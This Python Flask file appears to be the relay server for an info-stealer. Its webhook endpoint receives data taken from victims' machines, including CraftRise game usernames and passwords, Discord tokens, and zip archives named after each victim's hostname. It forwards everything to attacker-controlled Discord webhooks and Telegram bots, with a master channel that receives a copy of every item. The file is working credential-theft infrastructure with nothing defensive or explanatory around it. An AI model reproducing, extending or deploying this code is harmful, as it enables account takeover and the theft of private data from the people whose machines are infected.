from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

LOGO_SIGN = "https://media.discordapp.net/attachments/1531817920907448421/1535048621937000498/JlTlE.jpg?ex=6a7658ef&is=6a75076f&hm=69ba75845e28c680fbe3074e564ad63b4d64a8a11a43cc2a175278e6e0f47a8f&=&format=webp"

def clean_text(text):
    if not text: return ""
    text = re.sub(r'<a?:[a-zA-Z0-9_]+:\d+>', '', str(text))
    text = text.replace("**", "").replace("`", "").replace("*", "").replace("\\_", "_")
    text = text.replace("@everyone", "").replace("@here", "")
    return text.strip()

def send_telegram_msg(token, chat_id, msg):
    if not (token and chat_id and msg): return
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": msg}, timeout=30)
    except: pass

def send_telegram_file(token, chat_id, file_bytes, filename="backup.zip"):
    if not (token and chat_id and file_bytes): return
    try:
        files = {'document': (filename, file_bytes)}
        requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data={"chat_id": chat_id}, files=files, timeout=60)
    except: pass

def send_discord(url, data, files=None):
    if not url: return
    try:
        if files:
            requests.post(url, data=data, files=files, timeout=60)
        else:
            requests.post(url, json=data, timeout=30)
    except: pass

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        if request.is_json:
            data = request.get_json()
            file_bytes = None
        else:
            data = request.form.to_dict()
            file_bytes = request.files.get('file').read() if request.files.get('file') else None
            for key in ['embeds', 'creds']:
                if key in data and isinstance(data[key], str):
                    try: data[key] = json.loads(data[key])
                    except: pass

        log_type = data.get("type", "unknown")
        hostname = data.get("hostname", "Unknown")

        embeds = data.get("embeds", [])
        if not isinstance(embeds, list):
            embeds = [embeds] if embeds else []

        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            creds = data.get("creds", {})
            user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
            pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
            
            # Discord
            cr_embed = {
                "embeds": [{
                    "title": "CraftRise",
                    "color": 0xFF6B00,
                    "fields": [
                        {"name": "Account", "value": f"{user}:{pw}", "inline": False},
                        {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon - 31makinesii", "inline": False}
                    ],
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            send_discord(CRAFTRISE_WEBHOOK, cr_embed)
            
            # Telegram
            send_telegram_msg(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, f"CraftRise\n{user}:{pw}")

        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            tokens = data.get("tokens", [])
            if isinstance(tokens, str):
                try: tokens = json.loads(tokens)
                except: tokens = [tokens]
            
            if tokens:
                # Discord
                discord_embed = {
                    "embeds": [{
                        "title": "Discord",
                        "color": 0x5865F2,
                        "fields": [
                            {"name": "Tokens", "value": f"{len(tokens)} Token", "inline": False},
                            {"name": "PC", "value": hostname, "inline": False},
                            {"name": "Signature", "value": "S4/Mr.cekikgozlusampiyon - 31makinesii", "inline": False}
                        ],
                        "timestamp": datetime.utcnow().isoformat()
                    }]
                }
                send_discord(DISCORD_WEBHOOK, discord_embed)
                
                # Telegram (her token tek tek)
                for token in tokens:
                    send_telegram_msg(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, f"Discord\nToken: {token}")

        # ============ MASTER ============
        else:
            if embeds:
                for embed in embeds:
                    if "fields" in embed:
                        embed["fields"].append({
                            "name": "Signature",
                            "value": "S4/Mr.cekikgozlusampiyon - 31makinesii",
                            "inline": False
                        })
                    if "footer" not in embed:
                        embed["footer"] = {"text": "S4/Mr.cekikgozlusampiyon - 31makinesii"}
                    if "thumbnail" not in embed:
                        embed["thumbnail"] = {"url": LOGO_SIGN}
            
            if file_bytes:
                # Master Webhook
                files = {'file': (f"{hostname}.zip", file_bytes)}
                send_discord(MASTER_WEBHOOK, {'content': data.get("content", "")}, files)
                send_discord(WEBHOOK, {'content': data.get("content", "")}, files)
                # Telegram
                send_telegram_file(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
                send_telegram_file(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, file_bytes, f"{hostname}.zip")
            else:
                send_discord(MASTER_WEBHOOK, {"embeds": embeds})
                send_discord(WEBHOOK, {"embeds": embeds})

        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[-] Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home(): return "Proxy Active"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
